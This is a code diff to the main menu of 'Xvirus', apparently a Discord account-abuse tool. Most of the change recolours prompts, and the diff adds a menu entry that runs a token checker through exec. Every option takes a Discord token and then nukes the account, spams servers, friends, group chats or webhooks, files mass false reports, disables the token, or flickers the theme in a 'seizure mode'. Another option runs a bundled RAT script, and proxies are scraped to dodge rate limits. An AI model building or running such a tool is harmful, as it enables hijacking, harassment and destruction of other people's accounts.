@@ -39,16 +39,16 @@ def main():
         banner("neon")
 
     choice = input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Choice: {Fore.RED}')
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Choice: {Fore.RED}')
     #all options
     if choice == "1":
         token = input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
         Server_Name = str(input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Name of the servers that will be created: {Fore.RED}'))
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Name of the servers that will be created: {Fore.RED}'))
         message_Content = str(input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Message that will be sent to every friend: {Fore.RED}'))
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Message that will be sent to every friend: {Fore.RED}'))
         if threading.active_count() < threads:
             threading.Thread(target=util.accountNuke.Xvirus_Nuke, args=(token, Server_Name, message_Content)).start()
             return
@@ -56,7 +56,7 @@ def main():
 
     elif choice == '2':
         token = input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
         #get all friends
         processes = []
@@ -75,7 +75,7 @@ def main():
 
     elif choice == '3':
         token = input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
         if token.startswith("mfa."):
             print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Just a headsup Xvirus wont be able to delete the servers since the account has 2fa enabled')
@@ -96,12 +96,12 @@ def main():
                 
 
     elif choice == '4':
-        token = input(f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
+        token = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
         print(f'{Fore.BLUE}Do you want to have a icon for the servers that will be created?')
-        yesno = input(f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}yes/no: {Fore.RED}')
+        yesno = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}yes/no: {Fore.RED}')
         if yesno.lower() == "yes":
-            image = input(f'Example: (C:\\Users\\myName\\Desktop\\Xvirus\\ShitOn.png):\n{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Please input the icon location: {Fore.RED}')
+            image = input(f'Example: (C:\\Users\\myName\\Desktop\\Xvirus\\ShitOn.png):\n{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Please input the icon location: {Fore.RED}')
             if not os.path.exists(image):
                 print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Couldn\'t find "{image}" on your pc')
                 sleep(3)
@@ -116,7 +116,7 @@ def main():
     {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Custom server names  
                         ''')
         secondchoice = input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Second Choice: {Fore.RED}')
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Second Choice: {Fore.RED}')
         if secondchoice not in ["1", "2"]:
             print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Second Choice')
             sleep(1)
@@ -136,7 +136,7 @@ def main():
 
         if secondchoice == "2":
             name = str(input(
-                f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Name of the servers that will be created: {Fore.RED}'))
+                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Name of the servers that will be created: {Fore.RED}'))
             processes = []
             for i in range(25):
                 t = multiprocessing.Process(target=util.spamservers.SpamServers, args=(token, icon, name))
@@ -152,7 +152,7 @@ def main():
 
     elif choice == '5':
         token = input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
         processes = []
         channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
@@ -170,10 +170,10 @@ def main():
 
     elif choice == '6':
         token = input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
         message = str(input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Message that will be sent to every friend: {Fore.RED}'))
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Message that will be sent to every friend: {Fore.RED}'))
         processes = []
         channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
         for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
@@ -190,7 +190,7 @@ def main():
 
     elif choice == '7':
         token = input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
         print(f'{Fore.MAGENTA}Starting seizure mode {Fore.RESET}{Fore.WHITE}(Switching on/off Light/dark mode){Fore.RESET}\n')
         processes = [] 
@@ -208,20 +208,20 @@ def main():
 
     elif choice == '8':
         token = input(
-        f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
+        f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
         util.info.Info(token)
 
 
     elif choice == '9':
         token = input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
         util.login.TokenLogin(token)
 
     elif choice == '10':
         token = input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
         processes = []
         friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
@@ -239,7 +239,7 @@ def main():
 
     elif choice == '11':
         token = input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
         print(f'''
     {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Status changer
@@ -247,19 +247,19 @@ def main():
     {Fore.RESET}[{Fore.RED}3{Fore.RESET}] HypeSquad changer    
                         ''')
         secondchoice = input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Setting: {Fore.RED}')
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Setting: {Fore.RED}')
         if secondchoice not in ["1", "2", "3"]:
             print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid choice')
             sleep(1)
             main()
         if secondchoice == "1":
             status = input(
-                f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Custom Status: {Fore.RED}')
+                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Custom Status: {Fore.RED}')
             util.profilechanger.StatusChanger(token, status)
 
         if secondchoice == "2":
             bio = input(
-                f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Custom bio: {Fore.RED}')
+                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Custom bio: {Fore.RED}')
             util.profilechanger.BioChanger(token, bio)
 
         if secondchoice == "3":
@@ -269,7 +269,7 @@ def main():
 {Fore.RESET}[{Fore.LIGHTGREEN_EX}3{Fore.RESET}]{Fore.LIGHTGREEN_EX} HypeSquad Balance
                         ''')
             thirdchoice = input(
-                f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Hypesquad: {Fore.RED}')
+                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Hypesquad: {Fore.RED}')
             if thirdchoice not in ["1", "2", "3"]:
                 print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid choice')
                 sleep(1)
@@ -296,21 +296,21 @@ def main():
     elif choice == '15':
         print(f"\n{Fore.RED}(the token you input is the account that will send the reports){Fore.RESET}")
         token = input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
         guild_id1 = str(input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Server ID: {Fore.RED}'))
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Server ID: {Fore.RED}'))
         channel_id1 = str(input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Channel ID: {Fore.RED}'))
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Channel ID: {Fore.RED}'))
         message_id1 = str(input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Message ID: {Fore.RED}'))
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Message ID: {Fore.RED}'))
         reason1 = str(input(
             '\n[1] Illegal content\n'
             '[2] Harassment\n'
             '[3] Spam or phishing links\n'
             '[4] Self-harm\n'
             '[5] NSFW content\n\n'
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Reason: {Fore.RED}'))
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Reason: {Fore.RED}'))
         if reason1.upper() in ('1', 'ILLEGAL CONTENT'):
             reason1 = 0
         elif reason1.upper() in ('2', 'HARASSMENT'):
@@ -330,7 +330,7 @@ def main():
 
     elif choice == "16":
         token = input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
         util.groupchat_spammer.GcSpammer(token)
 
@@ -341,14 +341,14 @@ def main():
     {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Webhook Spammer    
                         ''')
         secondchoice = int(input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Second Choice: {Fore.RED}'))
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Second Choice: {Fore.RED}'))
         if secondchoice not in [1, 2]:
             print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Second Choice')
             sleep(1)
             main()
         if secondchoice == 1:
             WebHook = input(
-                f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.RED}')
+                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Webhook: {Fore.RED}')
             validateWebhook(WebHook)
             try:
                 requests.delete(WebHook)
@@ -356,22 +356,25 @@ def main():
             except Exception as e:
                 print(f'{Fore.RED}Error: {Fore.WHITE}{e} {Fore.RED}happened while trying to delete the Webhook')
 
-            input(f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue. . . {Fore.RED}')
+            input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Enter anything to continue. . . {Fore.RED}')
             main()
         if secondchoice == 2:
             WebHook = input(
-                f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.RED}')
+                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Webhook: {Fore.RED}')
             validateWebhook(WebHook)
             Message = str(input(
-                f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Message: {Fore.RED}'))
+                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Message: {Fore.RED}'))
             util.webhookspammer.WebhookSpammer(WebHook, Message)
+
+    elif choice == '18':
+        exec(open('util/tokenchecker.py').read())
 
     elif choice == '19':
         token = input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
         util.tokendisable.TokenDisable(token)
-
+        
     elif choice == '20':
         exec(open('util/rat.py').read())
 
@@ -406,7 +409,7 @@ def main():
         main()
 
 # this is end settings
-    elif choice == '18':
+    elif choice == '!':
         print(f'''
     {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Theme changer
     {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Amount of threads
@@ -414,7 +417,7 @@ def main():
     {Fore.RESET}[{Fore.RED}4{Fore.RESET}] {Fore.RED}Exit...    
                         ''')
         secondchoice = input(
-            f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Setting: {Fore.RED}')
+            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Setting: {Fore.RED}')
         if secondchoice not in ["1", "2", "3", "4"]:
             print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Setting')
             sleep(1)
@@ -428,7 +431,7 @@ def main():
 {Fore.CYAN}N{Fore.MAGENTA}e{Fore.CYAN}o{Fore.MAGENTA}n{Fore.CYAN}:{Fore.MAGENTA} 5
 """)
             themechoice = input(
-                f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}theme: {Fore.RED}')
+                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}theme: {Fore.RED}')
             if themechoice == "1":
                 setTheme('xeme')
             elif themechoice == "2":
@@ -451,7 +454,7 @@ def main():
             print(f"{Fore.BLUE}Current amount of threads: {threads}")
             try:
                 amount = int(
-                    input(f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Amount of threads: {Fore.RED}'))
+                    input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Amount of threads: {Fore.RED}'))
             except ValueError:
                 print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid amount')
                 sleep(1.5)
@@ -463,7 +466,7 @@ def main():
             elif amount >= 15:
                 print(f"{Fore.RED}WARNING! * WARNING! * WARNING! * WARNING! * WARNING! * WARNING! * WARNING!")
                 print(f"having the thread amount set to 15 or over can possible get laggy and higher chance of ratelimit\nare you sure you want to set the ratelimit to {Fore.YELLOW}{amount}{Fore.RED}?")
-                yesno = input(f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}yes/no: {Fore.RED}')
+                yesno = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}yes/no: {Fore.RED}')
                 if yesno.lower() != "yes":
                     sleep(0.5)
                     main()
@@ -483,7 +486,7 @@ def main():
 ctrl, shift, enter, esc, windows, left shift, right shift, left ctrl, right ctrl, alt gr, left alt, right alt
 """)
             sleep(1.5)
-            key = input(f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Key: {Fore.RED}')
+            key = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Key: {Fore.RED}')
             cancel_key = key
             print_slow(f"{Fore.GREEN}Cancel key set to {Fore.CYAN}{cancel_key}")
             sleep(0.5)
@@ -492,7 +495,7 @@ ctrl, shift, enter, esc, windows, left shift, right shift, left ctrl, right ctrl
         elif secondchoice == "4":
             setTitle("Exiting. . .")
             choice = input(
-                f'{Fore.GREEN}[{Fore.GREEN}>>>{Fore.GREEN}] {Fore.RESET}Are you sure you want to exit? (Y to confirm): {Fore.RED}')
+                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Are you sure you want to exit? (Y to confirm): {Fore.RED}')
             if choice.upper() == 'Y':
                 clear()
                 os._exit(0)
@@ -507,13 +510,11 @@ if __name__ == "__main__":
     setTitle("Xvirus Loading...")
     
     System.Size(120, 30)
-    Anime.Fade(Center.Center(logo), Colors.purple_to_blue, Colorate.Vertical, time=3)
     if os.path.basename(sys.argv[0]).endswith("exe"):
         search_for_updates()
         with open(os.getenv("temp")+"\\xvirus_proxies", 'w'): pass
         if not os.path.exists(os.getenv("temp")+"\\xvirus_theme"):
             setTheme('xeme')
-        clear()
         proxy_scrape()
         sleep(1.5)
         main()
@@ -530,7 +531,6 @@ if __name__ == "__main__":
         with open(os.getenv("temp")+"\\xvirus_proxies", 'w'): pass
         if not os.path.exists(os.getenv("temp")+"\\xvirus_theme"):
             setTheme('xeme')
-        clear()
         proxy_scrape()
         sleep(1.5)
         main()
